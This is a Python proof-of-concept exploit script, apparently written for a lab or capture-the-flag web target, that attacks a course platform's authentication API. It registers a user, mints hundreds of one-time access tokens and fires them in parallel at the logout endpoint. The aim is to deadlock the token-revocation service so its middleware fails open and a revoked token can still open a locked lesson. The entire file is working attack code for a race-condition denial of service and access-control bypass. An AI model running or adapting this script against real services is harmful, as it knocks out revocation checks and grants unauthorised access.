#!/usr/bin/env python3
"""
PoC v3: spam /api/auth/logout with OneTime tokens.
Each logout = 3 mutex ops on revocation service (Check + handler-Revoke +
middleware-Revoke), no DB. With enough parallelism, we trigger a timeout in
Service.Revoke or CheckRevoked → goroutine deadlock holding mutex → revocation
service permanently dead → middleware fail-opens forever → revoked B works.
"""
from __future__ import annotations
import os, sys, time, secrets, string, threading
from concurrent.futures import ThreadPoolExecutor
import requests

BASE = os.environ.get("BASE", "http://127.0.0.1:8080").rstrip("/")
N_FLOOD = int(os.environ.get("N_FLOOD", "200"))


def rand_user():
    u = "u" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(11))
    p = "Pw" + secrets.token_urlsafe(12)
    return u, p


def main():
    s = requests.Session()
    print(f"[i] target: {BASE}, N_FLOOD={N_FLOOD}")

    u, p = rand_user()
    s.post(f"{BASE}/api/auth/register", json={"username": u, "password": p}, timeout=10)
    user_tok = s.post(f"{BASE}/api/auth/login",
                      json={"username": u, "password": p}, timeout=10).json()["token"]
    print(f"[1] user: {u}")

    B = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
               headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]

    r = requests.get(f"{BASE}/api/courses/4",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    slug16 = next(l["slug"] for l in r.json()["lessons"] if l["id"] == 16 and l.get("slug"))
    print(f"[2] B used → slug16 = {slug16[:40]}...")

    r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    print(f"[3] /lessons/access pre-flood: {r.status_code} ({r.text[:80]})")
    if r.status_code == 200:
        print(f"    !! already 200, weird")
        return 0

    print(f"[4] pre-issuing {N_FLOOD} flood OneTime tokens...")
    flood_toks = []
    t0 = time.time()
    for i in range(N_FLOOD):
        try:
            t = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
                       headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]
            flood_toks.append(t)
        except Exception as e:
            print(f"    issue fail @{i}: {e}"); break
    print(f"    issued {len(flood_toks)} in {time.time()-t0:.1f}s")

    barrier = threading.Barrier(len(flood_toks))

    def fire_logout(tok):
        barrier.wait()
        try:
            requests.post(f"{BASE}/api/auth/logout",
                          headers={"Authorization": f"Bearer {tok}"}, timeout=15)
        except Exception:
            pass

    print(f"[5] firing {len(flood_toks)} parallel logout-with-OneTime...")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=len(flood_toks)) as ex:
        futs = [ex.submit(fire_logout, t) for t in flood_toks]
        for f in futs:
            try: f.result(timeout=20)
            except: pass
    print(f"    flood took {time.time()-t0:.2f}s")

    # Probe with revoked B
    print(f"[6] probing /lessons/access with revoked B...")
    for attempt in range(5):
        try:
            r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                             headers={"Authorization": f"Bearer {B}"}, timeout=10)
            print(f"    attempt {attempt}: {r.status_code} ({r.text[:200]})")
            if r.status_code == 200:
                print(f"\n[+] DEADLOCK CONFIRMED! body:\n{r.text}")
                return 0
        except Exception as e:
            print(f"    attempt {attempt}: ERROR {e}")
        time.sleep(0.3)

    print("\n[-] no deadlock yet — try N_FLOOD higher")
    return 1


if __name__ == "__main__":
    sys.exit(main())
